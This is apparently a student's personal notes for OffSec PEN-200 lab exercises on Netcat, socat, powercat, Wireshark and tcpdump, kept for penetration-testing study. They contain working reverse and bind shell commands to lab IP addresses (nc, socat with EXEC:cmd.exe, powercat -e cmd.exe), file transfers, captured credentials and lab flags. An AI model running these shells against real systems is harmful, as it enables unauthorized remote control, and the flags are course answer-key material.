---
id: offsec labs
tags: [offsec, labs]
created: 2023-01-13 19:19
---
# offsec labs

backlinks: [[snippets-bash]]

sources:

---

## PEN-200: 4.1.5 Netcat


Exercises

(To be performed on your own Kali and Windows 10 lab client machines - Reporting is not required for these exercises)

- Implement a simple chat between your Kali machine and Windows system.
- Use Netcat to create a: 
  - a. Reverse shell from Kali to Windows. 
  - b. Reverse shell from Windows to Kali. 
  - c. Bind shell on Kali. Use your Windows system to connect to it. 
  - d. Bind shell on Windows. Use your Kali machine to connect to it.
- Transfer a file from your Kali machine to Windows and vice versa.
- Conduct the exercises again with the firewall enabled on your Windows system. Adapt the exercises as necessary to work around the firewall protection and understand what portions of the exercise can no longer be completed successfully.

(To be performed with the Topic Exercises VMs under "Resources" - Reporting is not required for these exercises)

Imagine you just gained access to the shell server on the Kali VM #1. You determined this server had the traditional version of Netcat with the -e option enabled which has executed the following command: nc -nlvp 5555 -e /bin/bash. Use this new access to get the flag.

```shell
export IP=192.168.175.52

 nc -nv $IP 5555
(UNKNOWN) [192.168.175.52] 5555 (?) open
ls -la
total 56
drwxr-xr-x 1 student student  4096 Jan 21 01:58 .
drwxr-xr-x 1 root    root     4096 Jan  7  2022 ..
-rw-r--r-- 1 student student   220 Oct 23  2021 .bash_logout
-rw-r--r-- 1 student student  5349 Nov 29  2021 .bashrc
-rw-r--r-- 1 student student  3526 Oct 23  2021 .bashrc.original
drwxr-xr-x 3 student student  4096 Nov 29  2021 .config
drwxr-xr-x 3 student student  4096 Nov 29  2021 .java
-rw-r--r-- 1 student student   807 Oct 23  2021 .profile
-rw-r--r-- 1 student student 10644 Nov 18  2021 .zshrc
-rw-r--r-- 1 root    root       36 Jan 21 01:57 flag.txt
cat flag

cat flag.txt
OS{adb929818535e8ee15259a8aeb7d2726}

```

In the /challenge folder on the Kali VM #2, you will find a helper program called reverse_shell. This program takes an IP as its first argument and a port as the second argument. This program will then reach out with a reverse shell to that IP and port. For example, you can run ./reverse_shell 1.2.3.4 1337 to launch a reverse shell to 1.2.3.4 on port 1337. Use this helper program to receive a callback from the shell server and get your flag.

Note: You might not have a directly reachable IP address and that is ok. You can always just use the shell server to catch itself by using its localhost IP address and a high-level port (go with 50000+). If you do this, you will need to open a second shell on the shell server. Also, remember to copy and execute the reverse_shell binary from the student home folder.

```shell
#kali machine
nc -nvlp 9000
listening on [any] 9000 ...


#vm2
/challenge/reverse-shell 192.168.119.175 9000

# kali machine
connect to [192.168.119.175] from (UNKNOWN) [192.168.175.52] 54766
┌──(student㉿701c632c1d5d)-[~]
└─$ ls -la
ls -la
total 56
drwxr-xr-x 1 student student  4096 Jan 21 02:14 .
drwxr-xr-x 1 root    root     4096 Jan  7  2022 ..
-rw------- 1 student student   107 Jan 21 02:14 .bash_history
-rw-r--r-- 1 student student   220 Oct 23  2021 .bash_logout
-rw-r--r-- 1 student student  5349 Nov 29  2021 .bashrc
-rw-r--r-- 1 student student  3526 Oct 23  2021 .bashrc.original
drwxr-xr-x 3 student student  4096 Nov 29  2021 .config
drwxr-xr-x 3 student student  4096 Nov 29  2021 .java
-rw-r--r-- 1 student student   807 Oct 23  2021 .profile
-rw-r--r-- 1 student student 10644 Nov 18  2021 .zshrc

#flag was not generated so converted to base64, downloaded and converted back to get flag

```

You now need to transfer a file from the Kali VM #3 to your local Kali VM. In the /challenge folder in the Kali VM #3, you will find the flag program, a Linux binary that contains the flag. Use any of the methods discussed in this module to transfer this file from the shell server to your Kali VM. Once on your Kali VM, make executable and run the flag program as root to get the flag. Use port 60000 to accomplish this task.

```shell

nc -nvlp 60000 > flag                 
listening on [any] 60000 ...
connect to [192.168.119.175] from (UNKNOWN) [192.168.175.52] 33906



#vm 
# WE ARE IN A VPN CONNECTION SO NEED tun0
nc -nv 192.168.119.175 60000 < flag


# compare sizes and if the same, close connections

chmod +x flag

.flag

* Verifying that you are running this binary as root on your Kali VM.
Great job. Here is your flag: 
OS{16489266d4abec6e0ee46ea8ac0b5185}
Press any key to continue...


```
## PEN-200: 4.2.5 socat


 Exercises

(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)

- Use socat to transfer powercat.ps1 from your Kali machine to your Windows system. Keep the file on your system for use in the next section.

```shell
# windows box is in the labs section
export WINIP=192.168.175.10    
rdesktop -u student -p lab $WINIP      

# LinuxAlice
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 powercat.ps1
sudo socat TCP4-LISTEN:443,fork file:powercat.ps1 

#WindowsBob 
# powershell

socat TCP4:192.168.119.175:443 STDOUT >> powercat.ps1

```

- Use socat to create an encrypted reverse shell from your Windows system to your Kali machine.

```shell

# LinuxAlice setup listener
socat -d -d OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0 STDOUT

# WindowsBob
socat -d -d OPENSSL:192.168.119.175:443,verify=0 EXEC:cmd.exe,pipes


```

- Create an encrypted bind shell on your Windows system. Try to connect to it from Kali without encryption. Does it still work?


- Make an unencrypted socat bind shell on your Windows system. Connect to the shell using Netcat. Does it work?

```shell 

# jibberish

```

Note: If cmd.exe is not executing, research what othercd parameters you may need to pass to the EXEC option based on the error you receive.

(To be performed with the Topic Exercises VMs under "Resources" - Reporting is not required for these exercises)

Imagine you just gained access to a server. This time, you do not want anyone to be able to view your traffic so you decide to use an encrypted connection. Power on VM #1 and connect to the port in the info tab to get the flag.

```shell

OPENSSL:192.168.175.52:32794,cert=bind_shell.pem,verify=0
2023/01/21 19:11:34 socat[87518] N reading from and writing to stdio
2023/01/21 19:11:34 socat[87518] N opening connection to AF=2 192.168.175.52:32794
2023/01/21 19:11:35 socat[87518] N successfully connected from local address AF=2 192.168.119.175:56178
2023/01/21 19:11:35 socat[87518] N option openssl-verify disabled, no check of certificate
2023/01/21 19:11:35 socat[87518] N SSL proto version used: TLSv1.3
2023/01/21 19:11:35 socat[87518] N SSL connection using TLS_AES_256_GCM_SHA384
2023/01/21 19:11:35 socat[87518] N SSL connection compression "none"
2023/01/21 19:11:35 socat[87518] N SSL connection expansion "none"
2023/01/21 19:11:35 socat[87518] N starting data transfer loop with FDs [0,1] and [6,6]

ls
bind-shell.pem
flag.txt
cat flag.txt
OS{c38eaa25f4c5fe8aea3624b150739094}



```

Surprise! You just gained access to yet another server. You cannot reach out to this server (still behind an imaginary firewall), and, instead, you need this server to call back to you. You are also worried about sending commands in the clear so you decide to use encryption this time. In _/usr/bin/ on the Kali VM, you will find a helper program called encrypted-reverse-shell. This program takes an IP and port as its first and second arguments, respectively. This program will then reach out with an encrypted (openssl) reverse rshell to that IP and port. For example, you can run ./encrypted-reverse-shell 1.2.3.4 1337 to launch an encrypted reverse rshell to 1.2.3.4 on port 1337. Use this helper script to receive a callback from the shell server and get your flag.

Note: You might not have a directly reachable IP address and that is ok. You can always just use the shell server to catch itself by using its IP address and a high-level port (go with 50000+). If you do this, you will need to open a second shell on the shell server (that is a second ssh session).

```shell

#kali
socat -d -d OPENSSL-LISTEN:9005,cert=bind_shell.pem,verify=0 STDOUT


#vm
/usr/bin/encrypted-reverse-shell 192.168.119.175 9005

ls 
flag.txt

cat flag.txt
OS{6406a8f3d4cd35cb6ec8365a88068fa4}


```

## PEN-200: 4.3.9 powercat

Exercises

(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)

- Use PowerShell and powercat to create a reverse shell from your Windows system to your Kali machine.

```shell
# kali
nc -nlvp 9000


# windows
powercat -c 192.168.119.132 -p 9000 -e cmd.exe

# kali has shell
c -nvlp 9000
listening on [any] 9000 ...
connect to [192.168.119.132] from (UNKNOWN) [192.168.132.10] 50407
Microsoft Windows [Version 10.0.16299.15]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
corp\administrator

C:\Windows\system32>



```

- Use PowerShell and powercat to create a bind shell on your Windows system and connect to it from your Kali machine. Can you also use powercat to connect to it locally?

```shell

# windows



```

- Use powercat to generate an encoded payload and then have it executed through powershell. Have a reverse shell sent to your Kali machine, also create an encoded bind shell on your Windows system and use your Kali machine to connect to it.

```shell
answer

```

(To be performed with the Topic Exercises VMs under "Resources" - Reporting is not required for these exercises)

Despite the fact that the Kali VM #1 looks like a Linux machine (it is a Linux machine), you can access a PowerShell prompt by running ./powerflag in the /challenge folder. Inside this directory, you will also find a modified version of powercat. Use the PowerShell prompt provided by powerflag along with powercat to gain a shell on your machine. Once you complete this connection, you will receive the flag.",

NOTE: Two SSH connections are needed in order to complete the task.

HINT: Once started ./powerflag , make sure to import any required PowerShell module.

```shell

# ssh1 
PS /challenge> powercat -l -p 8000 -ep -rep


# ssh2 
# localhost failed, tried 127
nc 127.0.0.1 8000



# ssh1 
PS /challenge> powercat -l -p 8000 -ep -rep
OS{a60fb0598da27a36fde972736d9f2fe1}

```

## PEN-200: 4.4.6 wireshark

Exercises

(To be performed on your own Kali machine - Reporting is required for these exercises)

- Use Wireshark to capture network activity while attempting to connect to 10.11.1.217 on port 110 using Netcat, and then attempt to log into it.

```shell
answer

```

- Read and understand the output. Where is the three-way handshake happening? Where is the connection closed?

```shell
31	4.041480223	192.168.119.132	10.11.1.217	TCP	76	35634	110	35634 → 110 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM TSval=551657063 TSecr=0 WS=128
34	4.281780980	10.11.1.217	192.168.119.132	TCP	76	110	35634	110 → 35634 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1358 SACK_PERM TSval=182162880 TSecr=551657063 WS=128
35	4.281811722	192.168.119.132	10.11.1.217	TCP	68	35634	110	35634 → 110 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=551657304 TSecr=182162880
```

- Follow the TCP stream to read the login attempt.

```shell
Frame 190: 95 bytes on wire (760 bits), 95 bytes captured (760 bits) on interface any, id 0
Linux cooked capture v1
Internet Protocol Version 4, Src: 10.11.1.217, Dst: 192.168.119.132
Transmission Control Protocol, Src Port: 110, Dst Port: 35634, Seq: 141, Ack: 21, Len: 27
    Source Port: 110
    Destination Port: 35634
    [Stream index: 2]
    [Conversation completeness: Incomplete, DATA (15)]
    [TCP Segment Len: 27]
    Sequence Number: 141    (relative sequence number)
    Sequence Number (raw): 2520776003
    [Next Sequence Number: 168    (relative sequence number)]
    Acknowledgment Number: 21    (relative ack number)
    Acknowledgment number (raw): 2248402885
    1000 .... = Header Length: 32 bytes (8)
    Flags: 0x018 (PSH, ACK)
    Window: 46
    [Calculated window size: 5888]
    [Window size scaling factor: 128]
    Checksum: 0x7a7d [unverified]
    [Checksum Status: Unverified]
    Urgent Pointer: 0
    Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
        TCP Option - No-Operation (NOP)
        TCP Option - No-Operation (NOP)
        TCP Option - Timestamps
    [Timestamps]
        [Time since first frame in this TCP stream: 46.299330736 seconds]
        [Time since previous frame in this TCP stream: 2.956241177 seconds]
    [SEQ/ACK analysis]
    TCP payload (27 bytes)
Post Office Protocol
    -ERR [AUTH] Invalid login\r\n

```

- Use the display filter to only monitor traffic on port 110.

```shell
tcp.port == 110

```

- Run a new session, this time using the capture filter to only collect traffic on port 110.
- 
```shell
port 110

```


(To be performed with the Topic Exercises VMs under "Resources" - Reporting is not required for these exercises)

6.To solve this challenge, on VM #1 you need to determine the password that was used to get into the remote server. To do this, download password_cracking.pcap from VM #1 webserver. This task is mainly focused on reading packet captures, but it also uses some skills not directly taught in this module like decoding encoded strings or identifying authentication that are very useful for future problems.

```shell

Frame 956: 213 bytes on wire (1704 bits), 211 bytes captured (1688 bits)
Ethernet II, Src: 8a:66:5a:51:48:65 (8a:66:5a:51:48:65), Dst: VMware_cb:f9:bc (00:0c:29:cb:f9:bc)
Internet Protocol Version 4, Src: 172.16.161.1, Dst: 172.16.161.129
Transmission Control Protocol, Src Port: 55905, Dst Port: 8080, Seq: 1, Ack: 1, Len: 147
    Source Port: 55905
    Destination Port: 8080
    [Stream index: 51]
    [Conversation completeness: Complete, WITH_DATA (31)]
    [TCP Segment Len: 147]
    Sequence Number: 1    (relative sequence number)
    Sequence Number (raw): 4284086721
    [Next Sequence Number: 148    (relative sequence number)]
    Acknowledgment Number: 1    (relative ack number)
    Acknowledgment number (raw): 4180059003
    1000 .... = Header Length: 32 bytes (8)
    Flags: 0x018 (PSH, ACK)
        000. .... .... = Reserved: Not set
        ...0 .... .... = Accurate ECN: Not set
        .... 0... .... = Congestion Window Reduced: Not set
        .... .0.. .... = ECN-Echo: Not set
        .... ..0. .... = Urgent: Not set
        .... ...1 .... = Acknowledgment: Set
        .... .... 1... = Push: Set
        .... .... .0.. = Reset: Not set
        .... .... ..0. = Syn: Not set
        .... .... ...0 = Fin: Not set
        [TCP Flags: ·······AP···]
    Window: 2058
    [Calculated window size: 131712]
    [Window size scaling factor: 64]
    Checksum: 0xd209 [unverified]
    [Checksum Status: Unverified]
    Urgent Pointer: 0
    Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
        TCP Option - No-Operation (NOP)
            Kind: No-Operation (1)
        TCP Option - No-Operation (NOP)
            Kind: No-Operation (1)
        TCP Option - Timestamps
            Kind: Time Stamp Option (8)
            Length: 10
            Timestamp value: 431227840: TSval 431227840, TSecr 1180676489
            Timestamp echo reply: 1180676489
    [Timestamps]
        [Time since first frame in this TCP stream: 0.000109000 seconds]
        [Time since previous frame in this TCP stream: 0.000012000 seconds]
    [SEQ/ACK analysis]
        [iRTT: 0.000097000 seconds]
        [Bytes in flight: 147]
        [Bytes sent since last PSH flag: 147]
    TCP payload (147 bytes)
Hypertext Transfer Protocol
    GET / HTTP/1.1\r\n
        [Expert Info (Chat/Sequence): GET / HTTP/1.1\r\n]
            [GET / HTTP/1.1\r\n]
            [Severity level: Chat]
            [Group: Sequence]
        Request Method: GET
        Request URI: /
        Request Version: HTTP/1.1
    Host: 172.16.161.129:8080\r\n
    Accept-Encoding: identity\r\n
    Authorization: Basic T1N7MGVhZWQ0NDAyNDk4ZjZhZWI1NzZmMzJkNGRkMjA3Y2V9==\r\n
        Credentials: OS{0eaed4402498f6aeb576f32d4dd207ce}
    \r\n
    [Full request URI: http://172.16.161.129:8080/]
    [HTTP request 1/1]
    [Response in frame: 966]
[Packet size limited during capture: HTTP truncated]



```

Let’s continue to test those network analysis skills; however, you will actually be the one capturing the traffic this time. Download traffic-capture executable file from Practical Tools - Wireshark - VM #2 webserver on port 80 and make it connect to the Practical Tools Wireshark VM #2. This program will connect to and log into a remote server. Observe the traffic, determine the required information (server, port, and credentials), and then log into this remote server to get the flag.

```shell

└─$ ./traffic-capture 192.168.132.52 
This program is about to make a connection to a remote server (192.168.132.52) and log-in.
Capture the traffic from this program.
Then, use this traffic to determine both the destination port and the required credentials.
Finally, use this information to connect to the remote server (192.168.132.52), log-in, and get the flag.
Transmitting...
Finished transmitting traffic. Goodbye



220 PTAP Fake Transfer Protocol (FTP) Service
USER offsec
331 offsec access allowed, send password.
PASS qwerty
230 offsec user logged in.
HELP
200 Command okay.
205 OPTIONS:
SYST
FLAG
HELP
QUIT
SYST
200 Command okay.
215 PTAP_Fake_Windows_NT
QUIT
221 Goodbye



┌──(kali㉿kali)-[~/…/bravo/offsec/pen200/4]
└─$ nc -nv 192.168.132.52 3084

(UNKNOWN) [192.168.132.52] 3084 (?) open
220 PTAP Fake Transfer Protocol (FTP) Service
user offsec
331 offsec access allowed, send password.
pass qwerty
230 offsec user logged in.
FLAG
200 Command okay.
1337 Great Job. The flag is:
OS{b191874e42bc81e5cd6a4e7e5ed81394}

```

## PEN-200: 4.5.3 tcpdump

- Use tcpdump to recreate the Wireshark exercise of capturing traffic on port 110.

```shell
tcpdump port 110
```

- Use the -X flag to view the content of the packet. If data is truncated, investigate how the -s flag might help.
 -s0 Snap length, is the size of the packet to capture. -s0 will set the size to unlimited - use this if you want to capture all the traffic.
```shell
tcpdump -nX -s0

```
- Find all 'SYN', 'ACK', and 'RST' packets in the password_cracking_filtered.pcap file.
- An alternative syntax is available in tcpdump where you can use a more user-friendly filter to display only ACK and PSH packets. Explore this syntax in the tcpdump manual by searching for "tcpflags". Come up with an equivalent display filter using this syntax to filter ACK and PSH packets.

Tcpflags are some combination of S (SYN), F (FIN), P (PUSH), R (RST), U (URG), W (ECN CWR), E (ECN-Echo) or `.' (ACK), or `none' if no flags are set.

```shell
ACK - sudo tcpdump 'tcp[13] & 16 != 0'
SYN - sudo tcpdump 'tcp[13] & 2 != 0'
FIN - sudo tcpdump 'tcp[13] & 1 != 0'
URG - sudo tcpdump 'tcp[13] & 32 != 0'
PSH - sudo tcpdump 'tcp[13] & 8 != 0'
RST - sudo tcpdump 'tcp[13] & 4 != 0'


tcpdump "tcp[tcpflags] & (tcp-syn|tcp-ack|tcp-rst) != 0"

```

